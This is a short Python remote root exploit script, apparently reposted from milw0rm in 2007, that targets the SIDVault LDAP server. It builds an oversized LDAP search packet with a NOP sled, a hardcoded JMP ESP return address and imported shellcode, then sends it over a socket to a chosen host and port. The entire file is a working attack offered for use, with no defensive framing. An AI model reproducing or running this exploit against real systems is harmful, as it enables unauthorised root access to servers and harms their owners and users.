#!/usr/bin/python

"""
Alpha Centauri Software SIDVault LDAP Server remote root exploit (0days)
"""
from payload import buf
import socket
import struct
from scapy import *
def shell_attack(target_machine, target_port):

   

    #
    # The address we will use is 0xffffe777 (JMP ESP in Ubuntu's linux-gate.so)
    #
    addr = b"\x77\xe7\xff\xff"

    theLine = b'\x90'*2076 + addr+ b'\x90'*(2019-len(buf)) + buf

    pkt  = b'0\x82\x10/\x02\x01\x01c\x82\x10(\x04\x82\x10\x06dc='
    pkt += theLine
    pkt += b'\n\x01\x02\n\x01\x00\x02\x01\x00\x02\x01\x00\x01\x01\x00\x87\x0bobjectClass0\x00'

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target_machine, target_port))
    s.send(pkt)
    s.close()

    # milw0rm.com [2007-08-25]